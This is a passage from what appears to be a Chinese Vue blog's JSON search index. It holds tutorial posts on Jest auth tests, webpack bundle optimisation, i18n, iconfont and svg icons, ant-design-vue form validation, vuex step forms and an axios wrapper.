currentAuth;\n}\n\nexport function check(authority) {\n  const current = getCurrentAuthority();\n  return current.some(item => authority.includes(item));\n}\n\nexport function isLogin() {\n  const current = getCurrentAuthority();\n  return current && current[0] !== \"guest\";\n}\n```\n\n## 执行单测命令\n\n```shell\nnpm run test:unit -- --watch\n```\n\n## 编写单测脚本\n\n在 tests/unit 下新建文件 auth.spec.js，然后编写脚本，简单的可以参考 example.spec.js 代码，详细的看 Jest[官方文档](https://jestjs.io/docs/en/getting-started)。本次示例代码：\n\n```js\nimport { check, currentAuth } from \"../../src/utils/auth\";\n\n// auth测试组\ndescribe(\"auth test\", () => {\n  it(\"empty auth\", () => {\n    // 清空currentAuth\n    currentAuth.splice(0, currentAuth.length);\n    expect(check([\"user\"])).toBeFalsy();\n    expect(check([\"admin\"])).toBeFalsy();\n  });\n\n  it(\"user auth\", () => {\n    // 清空currentAuth\n    currentAuth.splice(0, currentAuth.length);\n    currentAuth.push(\"user\");\n    expect(check([\"user\"])).toBeTruthy();\n    expect(check([\"admin\"])).toBeFalsy();\n  });\n\n  it(\"admin auth\", () => {\n    // 继续添加admin角色\n    currentAuth.push(\"admin\");\n    expect(check([\"user\"])).toBeTruthy();\n    expect(check([\"admin\"])).toBeTruthy();\n    expect(check([\"user\", \"admin\"])).toBeTruthy();\n  });\n});\n```","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@高效的构建打包发布","url":"%2Fvue-in-action-bundle%2F","content":"\n# 概述\n\n本文主要是针对 vue 项目的 webpack 打包文件大小优化相关讲解。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n总的思路就是尽量减小打包文件大小，具体方法就是按需加载，也就是更小颗粒度的去引用需要的功能模块。\n\n## 基础优化\n\n一，组件库按需引入组件：\n\n```js\n// src/main.js\n// babel-plugin-import 会帮助你加载 JS 和 CSS\nimport {\n  Layout,\n  Menu,\n  ...\n} from \"ant-design-vue\";\n```\n\n二，路由中使用“webpackChunkName”:\n\n```js\n// src/router.js\n...\n{\n  path: \"/user/login\",\n  name: \"login\",\n  component: () =>\n    import(/* webpackChunkName: \"user\" */ \"./views/User/Login.vue\")\n},\n...\n```\n\n三，第三方库按需打包\n如 lodash，可以直接引入具体方法，也可以通过 webpack 插件来按需打包：\n\n`import debounce from \"lodash/debounce\"`或者`import { debounce } from \"lodash\"`+ `babel-plugin-lodash lodash-webpack-plugin`\n\n## 分析打包报告并优化\n\n### 导出报告\n\n```shell\nnpm run build -- --report\n```\n\n示例图如下：\n![初始报告图](report.jpg)\n\n根据该分析报告，可以看出比较大的模块有@ant-design、moment 和 echarts。本次也将以此为例讲解。\n\n### @ant-design 优化\n\n这部分最大的优化点就是 icons 部分，本次讲下社区提供的[优化方案](https://github.com/HeskeyBaozi/reduce-antd-icons-bundle-demo)。\n\n创建 `src/icons.js`\n\n```js\n// 列举你需要的图标\nexport {\n  default as MenuFoldOutline\n} from \"@ant-design/icons/lib/outline/MenuFoldOutline\";\n\nexport {\n  default as MenuUnfoldOutline\n} from \"@ant-design/icons/lib/outline/MenuUnfoldOutline\";\n```\n\n配置 `vue.config.js`\n\n```js\nconfigureWebpack: {\n  resolve: {\n    alias: {\n      \"@ant-design/icons/lib/dist$\": path.resolve(__dirname, \"./src/icons.js\")\n    }\n  }\n},\n```\n\n该方案有个缺点就是你得列举所有用到的图标，包括组件内用到的，目前没发现其他更好的方案。\n\n### moment 优化\n\n针对 locale 语言包部分，本次也以社区提供的[优化方案](https://github.com/jmblog/how-to-optimize-momentjs-with-webpack)为例讲下。\n\n整体思路为两种，一种是先忽略整体语言包，然后业务层面引入特定的语言包文件；另一种是直接指定打包哪些语言文件。主要会用到 webpack 的两个内置插件 `IgnorePlugin` 和 `ContextReplacementPlugin`。\n\n一，IgnorePlugin 的使用\n\n移除所有语言包\n\n```js\n// vue.config.js\nconst webpack = require(\"webpack\");\nmodule.exports = {\n  //...\n  configureWebpack: {\n    plugins: [\n      // Ignore all locale files of moment.js\n      new webpack.IgnorePlugin(/^\\.\\/locale$/, /moment$/)\n    ]\n  }\n};\n```\n\n在需要的地方引入需要的语言包\n\n```html\n<!-- src/App.vue -->\n<script>\n  import moment from \"moment\";\n  import \"moment/locale/zh-cn\";\n  export default {\n    watch: {\n      \"$route.query.locale\": function(val) {\n        moment.locale(val === \"en_US\" ? \"en\" : \"zh-cn\");\n      }\n    }\n  };\n</script>\n```\n\n二，ContextReplacementPlugin 的使用\n\n```js\nconst webpack = require(\"webpack\");\nmodule.exports = {\n  //...\n  configureWebpack: {\n    plugins: [\n      // load `moment/locale/zh-cn.js`\n      new webpack.ContextReplacementPlugin(/moment[/\\\\]locale$/, /zh-cn/)\n    ]\n  }\n};\n```\n\n这样在你需要的地方就不用单独引入语言包了\n\n```html\n<!-- src/App.vue -->\n<script>\n  import moment from \"moment\";\n  // import \"moment/locale/zh-cn\";\n  export default {\n    watch: {\n      \"$route.query.locale\": function(val) {\n        moment.locale(val === \"en_US\" ? \"en\" : \"zh-cn\");\n      }\n    }\n  };\n</script>\n```\n\n### echarts 优化\n\n由整体引入 echarts 包改成按需引入。\n\n```js\n// 整体引入：\nimport echarts from \"echarts\";\n```\n\n```js\n// 按需引入：\n// 核心功能包\nimport echarts from \"echarts/lib/echarts\";\n// 用到的柱状图功能包\nimport \"echarts/lib/chart/bar\";\n// 标题功能包\nimport \"echarts/lib/component/title\";\n```\n\n经过以上三个模块的优化之后，报告图如下：\n![优化后报告图](report1.jpg)\n优化前后大小对比：\n![优化前](size0.jpg)\n![优化后](size1.jpg)\n\n## webpack 性能优化——DLL\n\nhttps://www.cnblogs.com/ghost-xyx/p/6472578.html\n\n# 参考\n\n极客时间——Vue 开发实战\n","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@国际化","url":"%2Fvue-in-action-i18n%2F","content":"\n# 概述\n\n国际化，包括组件库的国际化、第三库的国际化和本地业务的国际化。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n测试示例效果图：\n![overview](overview.jpg)\n\n<!-- more -->\n\n# 详述\n\n## 组件库的国际化\n\n以 ant-design-vue 库为例，针对国际化提供了 LocaleProvider 组件，具体使用如下：\n\n### 全局注册组件\n\n```js\nimport { LocaleProvider } from \"ant-design-vue\";\nVue.use(LocaleProvider);\n```\n\n### App.vue 中使用\n\n```html\n<template>\n  <div id=\"app\">\n    <a-locale-provider :locale=\"locale\">\n      <router-view />\n    </a-locale-provider>\n  </div>\n</template>\n\n<style></style>\n<script>\n  import zh_CN from \"ant-design-vue/lib/locale-provider/zh_CN\";\n  import en_US from \"ant-design-vue/lib/locale-provider/en_US\";\n  export default {\n    data() {\n      return {\n        locale: {\n          type: Object,\n          default: en_US\n        }\n      };\n    },\n    watch: {\n      \"$route.query.locale\": function(val) {\n        this.locale = val === \"en_US\" ? en_US : zh_CN;\n      }\n    }\n  };\n</script>\n```\n\n对于 locale 值的动态获取，本示例是通过路由的 query 实现的。例如本示例：\n\n```html\n<template>\n  <div>\n    <a-layout-header style=\"background: #fff; padding: 0\">\n      <a-dropdown style=\"float:right;margin-right:30px;\">\n        <a class=\"ant-dropdown-link\" href=\"javascript:void(0)\">\n          <a-icon type=\"global\" />\n        </a>\n        <a-menu slot=\"overlay\" @click=\"onClick\">\n          <a-menu-item key=\"zh_CN\">中文</a-menu-item>\n          <a-menu-item key=\"en_US\">English</a-menu-item>\n        </a-menu>\n      </a-dropdown>\n    </a-layout-header>\n  </div>\n</template>\n\n<script>\n  export default {\n    methods: {\n      onClick({ key }) {\n        this.$router.push({ query: { locale: key } });\n      }\n    }\n  };\n</script>\n<style scoped></style>\n```\n\n组件库国际化完成后，测试效果图：\n![效果图](1.jpg)\n\n我们发现日期选择组件中并没有完全国际化，原因就是组件库引用了第三方的 moment 库，而 moment 库有自己的国际化方式，说明见下面“第三方库的国际化”。\n\n## 第三方库的国际化\n\n针对`moment`库的国际化，在上段代码基础上修改如下：\n\n```html\n<!-- src/App.vue -->\n<script>\n  import zh_CN from \"ant-design-vue/lib/locale-provider/zh_CN\";\n  import en_US from \"ant-design-vue/lib/locale-provider/en_US\";\n  import moment from \"moment\";\n  import \"moment/locale/zh-cn\";\n  export default {\n    data() {\n      return {\n        locale: {\n          type: Object,\n          default: en_US\n        }\n      };\n    },\n    watch: {\n      \"$route.query.locale\": function(val) {\n        this.locale = val === \"en_US\" ? en_US : zh_CN;\n        moment.locale(val === \"en_US\" ? \"en\" : \"zh-cn\");\n      }\n    }\n  };\n</script>\n```\n\n## 本地业务的国际化\n\n推荐用[Vue I18n](https://kazupon.github.io/vue-i18n/)，本次也以该插件为例。\n\n例如上面的效果图，日期选择组件有个 label 的文案“time”，我们对它进行国际化。\n\n首先，本地创建国际化文件，例如：\n\n```js\n// src/local/zhCN.js\nexport default {\n  \"app.dashboard.analysis.timeLabel\": \"时间\"\n};\n```\n\n```js\n// src/local/enUS.js\nexport default {\n  \"app.dashboard.analysis.timeLabel\": \"Time\"\n};\n```\n\n然后，安装相关包文件：\n\n```shell\n# query-string 是方便解析URL查询字符串\nnpm install vue-i18n query-string -S\n```\n\n再然后，在 main.js 中进行注册配置：\n\n```js\n// 引入相关包\nimport VueI18n from \"vue-i18n\";\nimport enUS from \"./locale/enUS\";\nimport zhCN from \"./locale/zhCN\";\nimport queryString from \"query-string\";\n// 注册组件\nVue.use(VueI18n);\n// 创建一个实例\nconst i18n = new VueI18n({\n  locale: queryString.parse(location.search).locale || \"zh_CN\",\n  messages: {\n    zh_CN: { message: zhCN },\n    en_US: { message: enUS }\n  }\n});\n// 挂载到Vue实例\nnew Vue({\n  i18n,\n  router,\n  store,\n  render: h => h(App)\n}).$mount(\"#app\");\n```\n\n最后，在切换语言的地方，添加动态修改 locale：\n\n```js\n  onClick({ key }) {\n    this.$router.push({query: {locale: key}});\n    // 动态修改locale\n    this.$i18n.locale = key;\n  }\n```\n\n最终效果：\n![效果图](2.jpg)\n\n# 参考\n\n极客时间——Vue 开发实战\n","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@管理系统中使用的图标","url":"%2Fvue-in-action-icon%2F","content":"\n# 概述\n\n日常开发中，除了直接使用 UI 组件库提供有限图标外，怎么使用其他图标呢？目前主要有三种方式，雪碧图、字体图标和 svg 图标。雪碧图方式古老，字体图标方式流行，但是不支持多色图标，svg 方式逐渐流行，支持多色图标。本文主要讲下字体图标和 svg 图标的使用。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n![测试效果图](overview.jpg)\n\n<!-- more -->\n\n# 详述\n\n本次以阿里的图标开源库 [iconfont.cn](https://www.iconfont.cn)为例。\n\n## 出发\n\n平台注册账号，搜索需要图标的关键字，例如“404”，找到自己需要的可以收藏、加入购物车、添加到项目等。把需要的图标添加到自己创建的项目后，就可以在项目面板页管理和使用图标了。\n![项目面板截图](iconfont.jpg)\n\n## unicode 引用\n\nunicode 是字体在网页端最原始的应用方式，特点是：\n\n- 兼容性最好，支持 ie6+，及所有现代浏览器。\n- 支持按字体的方式去动态调整图标大小，颜色等等。\n- 但是因为是字体，所以不支持多色。只能使用平台里单色的图标，就算项目里有多色图标也会自动去色。\n\nunicode 使用步骤如下：\n\n第一步：拷贝项目下面生成的 font-face\n\n```css\n@font-face {\n  font-family: \"iconfont\";\n  src: url(\"iconfont.eot\");\n  src: url(\"iconfont.eot?#iefix\") format(\"embedded-opentype\"), url(\"iconfont.woff\")\n      format(\"woff\"), url(\"iconfont.ttf\") format(\"truetype\"), url(\"iconfont.svg#iconfont\")\n      format(\"svg\");\n}\n```\n\n第二步：定义使用 iconfont 的样式\n\n```css\n.iconfont {\n  font-family: \"iconfont\" !important;\n  font-size: 16px;\n  font-style: normal;\n  -webkit-font-smoothing: antialiased;\n  -webkit-text-stroke-width: 0.2px;\n  -moz-osx-font-smoothing: grayscale;\n}\n```\n\n第三步：挑选相应图标并获取字体编码，应用于页面\n\n```html\n<i class=\"iconfont\">&#x33;</i>\n```\n\nvue 使用示例如下：\n\n```html\n<template>\n  <div>\n    <i class=\"iconfont\">&#xe61c;</i>\n  </div>\n</template>\n\n<style scoped>\n  @font-face {\n    font-family: \"iconfont\"; /* project id 1212356 */\n    src: url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.eot\");\n    src: url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.eot?#iefix\") format(\"embedded-opentype\"),\n      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.woff2\") format(\"woff2\"),\n      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.woff\") format(\"woff\"), url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.ttf\")\n        format(\"truetype\"),\n      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.svg#iconfont\") format(\"svg\");\n  }\n  .iconfont {\n    font-family: \"iconfont\" !important;\n    font-size: 16px;\n    font-style: normal;\n    -webkit-font-smoothing: antialiased;\n    -webkit-text-stroke-width: 0.2px;\n    -moz-osx-font-smoothing: grayscale;\n  }\n</style>\n```\n\n## font-class 引用\n\nfont-class 是 unicode 使用方式的一种变种，主要是解决 unicode 书写不直观，语意不明确的问题。\n\n与 unicode 使用方式相比，具有如下特点：\n\n- 兼容性良好，支持 ie8+，及所有现代浏览器。\n- 相比于 unicode 语意明确，书写更直观。可以很容易分辨这个 icon 是什么。\n- 因为使用 class 来定义图标，所以当要替换图标时，只需要修改 class 里面的 unicode 引用。\n- 不过因为本质上还是使用的字体，所以多色图标还是不支持的。\n\n使用步骤如下：\n\n第一步：拷贝项目下面生成的 fontclass 代码：\n\n```css\n//at.alicdn.com/t/font_8d5l8fzk5b87iudi.css\n```\n\n第二步：挑选相应图标并获取类名，应用于页面：\n\n```html\n<i class=\"iconfont icon-xxx\"></i>\n```\n\nvue 使用示例如下：\n\n```html\n<template>\n  <div>\n    <i class=\"iconfont iconyunshu\"></i>\n  </div>\n</template>\n<style scoped>\n  @import url(//at.alicdn.com/t/font_1212356_mw76lv1oaul.css);\n</style>\n```\n\n## symbol 引用\n\n这是一种全新的使用方式，应该说这才是未来的主流，也是平台目前推荐的用法。相关介绍可以参考这篇文章 这种用法其实是做了一个 svg 的集合，与上面两种相比具有如下特点：\n\n- 支持多色图标了，不再受单色限制。\n- 通过一些技巧，支持像字体那样，通过 font-size,color 来调整样式。\n- 兼容性较差，支持 ie9+,及现代浏览器。\n- 浏览器渲染 svg 的性能一般，还不如 png。\n\n第一步：拷贝项目下面生成的 symbol 代码：\n\n```js\n//at.alicdn.com/t/font_8d5l8fzk5b87iudi.js\n```\n\n第二步：加入通用 css 代码（引入一次就行）：\n\n```html\n<style type=\"text/css\">\n  .icon {\n    width: 1em;\n    height: 1em;\n    vertical-align: -0.15em;\n    fill: currentColor;\n    overflow: hidden;\n  }\n</style>\n```\n\n第三步：挑选相应图标并获取类名，应用于页面：\n\n```html\n<svg class=\"icon\" aria-hidden=\"true\">\n  <use xlink:href=\"#icon-xxx\"></use>\n</svg>\n```\n\n普通页面测试代码：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />\n    <title>Document</title>\n    <script src=\"http://at.alicdn.com/t/font_1212356_01bv0xpc70ab.js\"></script>\n    <style type=\"text/css\">\n      .icon {\n        width: 1em;\n        height: 1em;\n        vertical-align: -0.15em;\n        fill: currentColor;\n        overflow: hidden;\n      }\n    </style>\n  </head>\n  <body>\n    <svg class=\"icon\" aria-hidden=\"true\">\n      <use xlink:href=\"#icontixingshixiang\"></use>\n    </svg>\n  </body>\n</html>\n```\n\n`.vue`单文件开发中，因为是模块化开发，是通过 webpack 编译打包的，因此第一步略有不同：保存该 js 文件到本地，在`main.js`中引入`import \"./assets/iconfont.js\";`。\n\n## ant-design-vue 中使用\n\n```html\n<template>\n  <div class=\"icons-list\">\n    <icon-font type=\"icon-tuichu\" />\n    <icon-font type=\"icon-facebook\" />\n    <icon-font type=\"icon-twitter\" />\n  </div>\n</template>\n<script>\n  import { Icon } from \"ant-design-vue\";\n\n  const IconFont = Icon.createFromIconfontCN({\n    scriptUrl: \"//at.alicdn.com/t/font_8d5l8fzk5b87iudi.js\"\n  });\n  export default {\n    components: {\n      IconFont\n    }\n  };\n</script>\n<style scoped>\n  .icons-list >>> .anticon {\n    margin-right: 6px;\n    font-size: 24px;\n  }\n</style>\n```\n\n示例是局部注册，当然对于通用的图标也可以 main.js 中进行全局注册。\n\n## 直接使用 svg 图标文件\n\n第一步：下载 svg 文件，保存到本地；\n\n第二步：安装 loader:\n\n```shell\nnpm install vue-svg-loader -D\n```\n\n第三步：组件中引入 svg 文件，注册组件：\n\n```js\nimport Logo from \"@/assets/logo.svg\";\nexport default {\n  components: {\n    Logo\n  }\n};\n```\n\n第四步：使用该图标组件：\n\n```html\n<template>\n  <div>\n    <Logo />\n  </div>\n</template>\n```\n\n# 参考\n\n[IconFont](https://www.iconfont.cn/help/detail?spm=a313x.7781069.1998910419.d8cf4382a&helptype=code)\n\n极客时间——Vue 开发实战\n","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@封装一个自动校验表单项","url":"%2Fvue-in-action-autoValidForm%2F","content":"\n# 概述\n\n自己封装一个支持自动校验表单项，以`ant-design-vue`组件为例。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 自定义一个组件 ReceiverAccount\n\n```html\n<template>\n  <a-input-group compact>\n    <a-select style=\"width: 130px;\" v-model=\"type\" @change=\"handleTypeChange\">\n      <a-select-option value=\"aplipay\">支付宝</a-select-option>\n      <a-select-option value=\"bank\">银行账户</a-select-option>\n    </a-select>\n    <a-input\n      style=\"width: calc(100% - 130px)\"\n      v-model=\"number\"\n      @change=\"handleNumberChange\"\n    />\n  </a-input-group>\n</template>\n\n<script>\n  export default {\n    props: {\n      value: {\n        type: Object\n      }\n    },\n    watch: {\n      value(val) {\n        Object.assign(this, val);\n      }\n    },\n    data() {\n      const { type, number } = this.value || {};\n      return {\n        type: type || \"aplipay\",\n        number: number || \"\"\n      };\n    },\n    methods: {\n      handleTypeChange(val) {\n        this.$emit(\"change\", { ...this.value, type: val });\n      },\n      handleNumberChange(e) {\n        this.$emit(\"change\", { ...this.value, number: e.target.value });\n      }\n    }\n  };\n</script>\n```\n\n## 使用自定义组件 ReceiverAccount\n\n```html\n<template>\n  <div>\n    <a-form :form=\"form\" layout=\"horizontal\">\n      <a-form-item\n        label=\"付款账户\"\n        :label-col=\"formItemLayout.labelCol\"\n        :wrapper-col=\"formItemLayout.wrapperCol\"\n      >\n        <a-input\n          v-decorator=\"[\n            'payAccount', \n            {\n              initialValue: step.payAccount,\n              rules: [{required: true, message: '请输入付款账号'}]\n            }\n          ]\"\n        />\n      </a-form-item>\n      <a-form-item\n        label=\"收款账户\"\n        :label-col=\"formItemLayout.labelCol\"\n        :wrapper-col=\"formItemLayout.wrapperCol\"\n      >\n        <ReceiverAccount\n          v-decorator=\"[\n            'receiverAccount', \n            {\n              initialValue: step.receiverAccount,\n              rules: [{required: true, message: '请输入收款账号', validator: checkReceiverAccount}]\n            }\n          ]\"\n        />\n      </a-form-item>\n      <a-form-item>\n        <a-button type=\"primary\" @click=\"handleSubmit\">\n          下一步\n        </a-button>\n      </a-form-item>\n    </a-form>\n  </div>\n</template>\n\n<script>\n  import ReceiverAccount from \"@/components/ReceiverAccount\";\n  export default {\n    components: {\n      ReceiverAccount\n    },\n    data() {\n      return {\n        formItemLayout: {\n          labelCol: { span: 4 },\n          wrapperCol: { span: 14 }\n        },\n        form: this.$form.createForm(this)\n      };\n    },\n    computed: {\n      step() {\n        return this.$store.state.form.step;\n      }\n    },\n    methods: {\n      handleSubmit() {\n        const { form, $router, $store } = this;\n        form.validateFields((err, values) => {\n          if (!err) {\n            $store.commit(\"form/saveStepFormData\", values);\n            $router.push(\"/form/step-form/confirm\");\n          }\n        });\n      },\n      checkReceiverAccount(rule, value, callback) {\n        if (value && value.number) {\n          callback();\n        } else {\n          callback(false);\n        }\n      }\n    }\n  };\n</script>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@分步表单","url":"%2Fvue-in-action-stepForm%2F","content":"\n# 概述\n\n假如该分步表单有三步，对应组件为 `Step1.vue`，`Step2.vue`，`Step3.vue`，第一步需要填写收款账号，第二步需要填写用户密码，可以回到上一步修改收款账号，可以直接填写密码提交后端接口进行数据可视化，成功后跳到第三步显示成功信息。主要知识点有 vuex 和编程式的导航。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n![效果图](step-form.gif)\n\n<!-- more -->\n\n# 详述\n\n## 创建 store，vuex 相关配置\n\n```js\n// src/store/modules/form.js\nimport router from \"../../router\";\nimport request from \"../../utils/request\";\n\nconst state = {\n  step: {\n    payAccount: \"123456\"\n  }\n};\n\nconst actions = {\n  async submitStepForm({ commit }, payload) {\n    console.log(payload);\n    await request({\n      url: \"/api/form\",\n      method: \"POST\",\n      data: payload\n    });\n    commit(\"saveStepFormData\", payload);\n    router.push(\"/form/step-form/result\");\n  }\n};\n\nconst mutations = {\n  saveStepFormData(state, payload) {\n    state.step = {\n      ...state.step,\n      ...payload\n    };\n  }\n};\n\nexport default {\n  namespaced: true,\n  state,\n  actions,\n  mutations\n};\n```\n\n```js\n// src/store/index.js\n\nimport Vue from \"vue\";\nimport Vuex from \"vuex\";\nimport form from \"./modules/form\";\n\nVue.use(Vuex);\n\nexport default new Vuex.Store({\n  state: {},\n  modules: {\n    form\n  }\n});\n```\n\n## 第一步\n\n调用 vuex 的 `mutations` 的 `saveStepFormData` 方法把数据保存到 `state`，然后路由跳转到第二步页面。\n\n```html\n<!-- Step1.vue -->\n<script>\n  export default {\n    data() {\n      return {\n        formItemLayout: {\n          labelCol: { span: 4 },\n          wrapperCol: { span: 14 }\n        },\n        form: this.$form.createForm(this)\n      };\n    },\n    computed: {\n      step() {\n        return this.$store.state.form.step;\n      }\n    },\n    methods: {\n      handleSubmit() {\n        const { form, $router, $store } = this;\n        form.validateFields((err, values) => {\n          if (!err) {\n            $store.commit(\"form/saveStepFormData\", values);\n            $router.push(\"/form/step-form/confirm\");\n          }\n        });\n      }\n    }\n  };\n</script>\n```\n\n## 第二步\n\n调用 `actions` 的 `submitStepForm` 方法，异步请求后端接口进行数据持久化，然后更新 `state`，最后路由跳转到成功页。\n\n```html\n<script>\n  export default {\n    data() {\n      return {\n        formItemLayout: {\n          labelCol: { span: 4 },\n          wrapperCol: { span: 14 }\n        },\n        form: this.$form.createForm(this)\n      };\n    },\n    computed: {\n      step() {\n        return this.$store.state.form.step;\n      }\n    },\n    methods: {\n      handleSubmit() {\n        const { form, $store, step } = this;\n        form.validateFields((err, values) => {\n          if (!err) {\n            $store.dispatch(\"form/submitStepForm\", { ...step, ...values });\n          }\n        });\n      },\n      handlePre() {\n        this.$router.push(\"/form/step-form/info\");\n      }\n    }\n  };\n</script>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@表单校验","url":"%2Fvue-in-action-ValidForm%2F","content":"\n# 概述\n\n表单校验很重要，分为自定义校验和动态校验。自定义校验就是自己去监听值变化来改变 dom 显示样式。动态校验就是利用框架封装的校验规则去使用。本次以 ant-design-vue 组件库中使用为例。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 自定义校验\n\n要点就是自己主动监听表单项的变化，然后对应的去修改 UI 组件暴露的属性值，通过不同值来显示不同的状态（错误、警告、成功等），例如 ant-design-vue 主要是控制 validate-status 和 help 两个属性，前者对应显示样式，后者对应提示文案。示例如下：\n\n```html\n<a-form-item label=\"用户名\" :validate-status=\"fieldAStatus\" :help=\"fieldAHelp\">\n  <a-input placeholder=\"用户名\" v-model=\"fieldA\" />\n</a-form-item>\n```\n\n```js\nmethods: {\n  submitHandle() {\n    if (this.fieldA.length < 6) {\n      this.fieldAStatus = \"error\";\n      this.fieldAHelp = \"不能小于6个字符\";\n    } else {\n      this.fieldAStatus = \"\";\n      this.fieldAHelp = \"\";\n    }\n  }\n}\n```\n\n## 动态校验\n\n要点就是按照使用的 UI 组件库规则来编写代码就可以了。例如 ant-design-vue，示例如下：\n\n```html\n<template>\n  <div>\n    <a-form :form=\"form\">\n      <a-form-item label=\"付款账户\">\n        <a-input\n          v-decorator=\"['payAccount',{rules: [{required: true, message: '请输入付款账号'}]}]\"\n        />\n      </a-form-item>\n      <a-form-item>\n        <a-button type=\"primary\" @click=\"check\">下一步</a-button>\n      </a-form-item>\n    </a-form>\n  </div>\n</template>\n\n<script>\n  export default {\n    data() {\n      return {\n        form: this.$form.createForm(this)\n      };\n    },\n    methods: {\n      check() {\n        this.form.validateFields(err => {\n          if (!err) {\n            console.info(\"success\");\n          }\n        });\n      }\n    }\n  };\n</script>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@axios二次封装","url":"%2Fvue-in-action-axios%2F","content":"\n# 概述\n\naxios 二次封装的相关总结。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 基础实现\n\n之所以需要二次封装，因为正常情况下，我们会针对错误之类的作统一处理，除了错误还有请求头，url 等，详细可参考 axios [官方文档](http://www.axios-js.com/)。\n\n```js\n// utils>request.js\nimport axios from \"axios\";\nimport { notification } from \"ant-design-vue\";\n\nfunction request(options) {\n  return axios(options)\n    .then(res => {\n      return res;\n    })\n    .catch(error => {\n      const {\n        response: { status, statusText }\n      } = error;\n      notification.error({\n        // jsx语法美化提示信息展示样式\n        message: h => (\n          <div>\n            请求错误 <span style=\"color: red\">{status}</span> : {options.url}\n          </div>\n        ),\n        description: statusText\n      });\n      return Promise.reject(error);\n    });\n}\n\nexport default request;\n```\n\n## 特别提示\n\n示例中 notification 的 message 部分使用了 jsx 语法，有关 vue 中使用 jsx 的方法如下：\n\n1. 首先需要安装`@vue/babel-preset-jsx`和`@vue/babel-helper-vue-jsx-merge-props`；\n2. 然后修改 babel 配置`presets: [\"@vue/app\", \"@vue/babel-preset-jsx\"],`；\n3. 最后在 vue 组件中使用，如上示例代码 message 部分。\n\n## 进阶实现\n\n以下是摘自[奇舞周刊](https://mp.weixin.qq.com/s/eqgf9MLEcLrooBhzgCVV6A)公众号。\n\n```js\nimport axios from \"axios\";\nimport router from \"../router\";\nimport { MessageBox, Message } from \"element-ui\";\nlet loginUrl = \"/login\";\n// 根据环境切换接口地址\naxios.defaults.baseURL = process.env.VUE_APP_API;\naxios.defaults.headers = { \"X-Requested-With\": \"XMLHttpRequest\" };\naxios.defaults.timeout = 60000;\n// 请求拦截器\naxios.interceptors.request.use(\n  config => {\n    if (router.history.current.path !== loginUrl) {\n      let token = window.sessionStorage.getItem(\"token\");\n      if (token == null) {\n        router.replace({\n          path: loginUrl,\n          query: { redirect: router.currentRoute.fullPath }\n        });\n        return false;\n      } else {\n        config.headers[\"Authorization\"] = \"JWT \" + token;\n      }\n    }\n    return config;\n  },\n  error => {\n    Message.warning(error);\n    return Promise.reject(error);\n  }\n);\n// 响应拦截器\naxios.interceptors.response.use(\n  response => {\n    return response.data;\n  },\n  error => {\n    if (error.response !== undefined) {\n      switch (error.response.status) {\n        case 400:\n          MessageBox.alert(error.response.data);\n          break;\n        case 401:\n          if (window.sessionStorage.getItem(\"out\") === null) {\n            window.sessionStorage.setItem(\"out\", 1);\n            MessageBox.confirm(\"会话已失效! 请重新登录\", \"提示\", {\n              confirmButtonText: \"重新登录\",\n              cancelButtonText: \"取消\",\n              type: \"warning\"\n            })\n              .then(() => {\n                router.replace({\n                  path: loginUrl,\n                  query: { redirect: router.currentRoute.fullPath }\n                });\n              })\n              .catch(action => {\n                window.sessionStorage.clear();\n                window.localStorage.clear();\n              });\n          }\n          break;\n        case 402:\n          MessageBox.confirm(\"登陆超时 ！\", \"提示\", {\n            confirmButtonText: \"重新登录\",\n            cancelButtonText: \"取消\",\n            type: \"warning\"\n          }).then(() => {\n            router.replace({\n              path: loginUrl,\n              query: { redirect: router.currentRoute.fullPath }\n            });\n          });\n          break;\n        case 403:\n          MessageBox.alert(\"没有权限！\");\n          break;\n        // ...忽略\n        default:\n          MessageBox.alert(`连接错误${error.response.status}`);\n      }\n      return Promise.resolve(error.response);\n    }\n    return Promise.resolve(error);\n  }\n);\n// 导出基础请求类型封装\nexport default {\n  get(url, param) {\n    if (param !== undefined) {\n      Object.assign(param, { _t: new Date().getTime() });\n    } else {\n      param = { _t: new Date().getTime() };\n    }\n    return new Promise((resolve, reject) => {\n      axios({ method: \"get\", url, params: param }).then(res => {\n        resolve(res);\n      });\n    });\n  },\n  getData(url, param) {\n    return new Promise((resolve, reject) => {\n      axios({ method: \"get\", url, params: param }).then(res => {\n        if (res.code === 4000) {\n          resolve(res.data);\n        } else {\n          Message.warning(res.msg);\n        }\n      });\n    });\n  },\n  post(url, param, config) {\n    return new Promise((resolve, reject) => {\n      axios.post(url, param, config).then(res => {\n        resolve(res);\n      });\n    });\n  },\n  put: axios.put,\n  _delete: axios.delete\n};\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n\n奇舞周刊\n","tags":["Vue"],"categories":["Vue"]},{"title":"Vue实战@使用mock数据","url":"%2Fvue-in-action-mock%2F","content":"\n# 概述\n\n在开发中使用 mock 数据有好多种方式，大点公司自己搭建接口平台系统，其他的可以使用 Easy Mock、Mock.js 等。在 webpack 工程项目下可以利用 webpack-dev-server 搭建一个简单快速灵活的 mock 